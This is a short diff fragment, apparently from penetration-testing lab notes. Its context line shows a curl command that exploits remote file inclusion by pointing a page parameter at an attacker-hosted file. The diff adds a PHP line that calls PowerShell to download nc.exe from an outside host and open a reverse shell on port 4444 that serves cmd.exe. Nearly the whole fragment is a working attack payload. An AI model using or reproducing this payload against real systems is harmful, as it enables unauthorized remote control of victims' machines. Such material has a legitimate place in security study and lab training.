@@ -68,7 +68,7 @@ $ curl "http://desserts.com/meteor/index.php?page=http://192.168.119.x:80/simple
 
 
 
-
+<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.x/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.x 4444 -e cmd.exe\" }"); ?>
 
 
 
